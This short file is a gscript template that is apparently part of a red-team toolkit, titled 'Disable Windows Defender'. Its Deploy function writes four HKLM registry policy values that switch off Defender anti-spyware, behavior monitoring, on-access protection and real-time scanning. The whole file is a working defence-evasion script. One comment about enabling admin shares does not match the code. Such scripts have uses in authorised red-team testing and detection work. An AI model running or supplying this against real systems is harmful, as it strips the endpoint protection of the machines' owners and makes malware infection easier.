// Example gscript template
// Title: Disable Windows Defender
// Author: ahhh
// Purpose: This will disable some features of windows defender, such as anti-spyware, behavior monitoring, on access protection, and real time scanning
// Gscript version: 1.0.0
// ATT&CK: 

//priority:91
//timeout:160

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting Disable Windows Defender");

    var value = 1
    // enable admin shares
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", value);
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", value);

    console.log("Done Disable Windows Defender");
    return true;
  }
  

